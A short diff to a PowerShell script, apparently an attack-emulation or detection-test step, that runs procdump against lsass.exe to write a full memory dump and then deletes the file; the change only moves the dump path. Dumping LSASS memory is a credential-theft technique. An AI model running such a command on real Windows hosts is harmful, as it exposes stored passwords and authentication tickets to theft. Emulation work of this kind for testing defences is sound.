@@ -13,7 +13,8 @@ if (-not (Test-Path $procdump)) {
 }
 
 Write-Host "[07] Running procdump against lsass.exe..."
-& $procdump -accepteula -ma lsass.exe lsass.dmp | Out-Null
+$dump = Join-Path $here "lsass.dmp"
+& $procdump -accepteula -ma lsass.exe $dump | Out-Null
 Write-Host "[07] Removing dump file..."
-Remove-Item lsass.dmp -Force -ErrorAction SilentlyContinue
+Remove-Item $dump -Force -ErrorAction SilentlyContinue
 Write-Host "[07] Done."
